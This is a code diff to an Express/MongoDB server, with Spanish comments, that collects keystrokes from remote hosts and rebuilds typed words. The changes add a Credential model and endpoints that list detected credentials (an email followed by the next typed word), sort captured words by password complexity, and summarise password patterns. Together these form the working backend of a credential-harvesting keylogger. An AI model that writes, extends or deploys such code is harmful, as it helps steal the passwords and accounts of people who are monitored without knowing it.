@@ -4,6 +4,7 @@ const path = require('path');
 
 const Keystroke = require('./models/Keystroke');
 const Word = require('./models/Word');
+const Credential = require('./models/Credential');
 const wordBuilder = require('./wordBuilder');
 
 const PORT = parseInt(process.env.PORT || '3000', 10);
@@ -59,7 +60,7 @@ function buildWordMatch(query) {
 app.post('/api/keystroke', async (req, res) => {
   try {
     const { host, window, key, timestamp } = req.body || {};
-    if (typeof key !== 'string' || key.trim() === '') {
+    if (typeof key !== 'string' || key === '') {
       return res.status(400).json({ error: 'key requerido' });
     }
 
@@ -67,21 +68,22 @@ app.post('/api/keystroke', async (req, res) => {
     const safeWindow = typeof window === 'string' ? window : '';
     const safeTimestamp = parseTimestamp(timestamp);
 
-    const doc = await Keystroke.create({
+    // IMPORTANTE: procesar la tecla de forma SINCRONA antes de cualquier await.
+    // handleKey es sincrono, asi se garantiza que las teclas se procesan
+    // en el orden exacto en que llegan (espacio separa palabras, etc.).
+    wordBuilder.handleKey({
       host: safeHost,
       window: safeWindow,
       key,
       timestamp: safeTimestamp
     });
 
-    // Encaminamos la pulsacion al reconstructor de palabras.
-    // (no bloqueamos la respuesta si falla una palabra)
-    wordBuilder.handleKey({
+    const doc = await Keystroke.create({
       host: safeHost,
       window: safeWindow,
       key,
       timestamp: safeTimestamp
-    }).catch(err => console.error('wordBuilder:', err.message));
+    });
 
     res.status(201).json({ id: doc._id });
   } catch (err) {
@@ -240,6 +242,88 @@ app.post('/api/stats/flush', async (req, res) => {
   try {
     await wordBuilder.flushAll();
     res.json({ ok: true });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// --------- Credenciales detectadas (emails + palabra siguiente) ---------
+
+// Lista de credenciales. ?host=&limit=&from=&to=
+app.get('/api/stats/credentials', async (req, res) => {
+  const match = {};
+  if (req.query.host) match.host = String(req.query.host);
+  try {
+    const range = parseDateRange(req.query);
+    if (Object.keys(range).length) match.timestamp = range;
+  } catch (err) {
+    return res.status(400).json({ error: err.message });
+  }
+
+  const limit = parseLimit(req.query.limit, 50, 500);
+
+  try {
+    const docs = await Credential.find(match)
+      .sort({ timestamp: -1 })
+      .limit(limit)
+      .lean();
+    res.json(docs);
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// --------- Patrones de contraseña ---------
+
+// Palabras clasificadas por complejidad. ?host=&limit=&from=&to=&complexity=
+app.get('/api/stats/password-patterns', async (req, res) => {
+  let match;
+  try { match = buildWordMatch(req.query); }
+  catch (err) { return res.status(400).json({ error: err.message }); }
+
+  // Solo palabras con complejidad no nula.
+  match.complexity = req.query.complexity
+    ? String(req.query.complexity)
+    : { $ne: null };
+
+  const limit = parseLimit(req.query.limit, 50, 500);
+
+  try {
+    const rows = await Word.aggregate([
+      { $match: match },
+      { $sort: { timestamp: -1 } },
+      { $limit: limit },
+      { $project: { _id: 0, word: 1, complexity: 1, host: 1, window: 1, timestamp: 1 } }
+    ]);
+    res.json(rows);
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// Resumen de patrones: cuantas palabras hay de cada complejidad.
+app.get('/api/stats/password-summary', async (req, res) => {
+  let match;
+  try { match = buildWordMatch(req.query); }
+  catch (err) { return res.status(400).json({ error: err.message }); }
+
+  match.complexity = { $ne: null };
+
+  try {
+    const rows = await Word.aggregate([
+      { $match: match },
+      { $group: { _id: '$complexity', count: { $sum: 1 } } },
+      { $project: { _id: 0, complexity: '$_id', count: 1 } },
+      { $sort: { count: -1 } }
+    ]);
+
+    const emailCount = await Credential.countDocuments(
+      Object.keys(match).length > 1
+        ? (() => { const m = { ...match }; delete m.complexity; return m; })()
+        : {}
+    );
+
+    res.json({ patterns: rows, emailCount });
   } catch (err) {
     res.status(500).json({ error: err.message });
   }
